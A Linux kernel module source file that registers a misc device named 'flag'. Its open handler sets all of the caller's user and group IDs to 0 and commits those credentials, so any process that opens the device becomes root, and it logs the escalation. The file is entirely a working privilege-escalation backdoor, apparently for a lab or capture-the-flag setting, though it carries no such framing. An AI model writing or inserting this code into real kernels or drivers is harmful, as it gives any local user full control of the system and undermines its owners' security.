#include <linux/module.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/cred.h> 
#include <linux/sched.h>    

#define DEVICE_NAME "flag"

static int dev_open(struct inode *inode, struct file *file) {
    struct cred *new_creds;

    new_creds = prepare_creds();
    if (!new_creds) {
        return -ENOMEM;
    }

    new_creds->uid.val   = 0;
    new_creds->euid.val  = 0;
    new_creds->suid.val  = 0;
    new_creds->fsuid.val = 0;
    new_creds->gid.val   = 0;
    new_creds->egid.val  = 0;
    new_creds->sgid.val  = 0;
    new_creds->fsgid.val = 0;

    commit_creds(new_creds);

    pr_info("[%s] Task %d successfully escalated to root via open().\n", DEVICE_NAME, current->pid);
    return 0; 
}

static const struct file_operations flag_fops = {
    .owner = THIS_MODULE,
    .open  = dev_open,
};

static struct miscdevice flag_misc = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = DEVICE_NAME,
    .fops  = &flag_fops,
};

static int __init flag_init(void) {
    return misc_register(&flag_misc);
}

static void __exit flag_exit(void) {
    misc_deregister(&flag_misc);
}

module_init(flag_init);
module_exit(flag_exit);

MODULE_LICENSE("GPL");
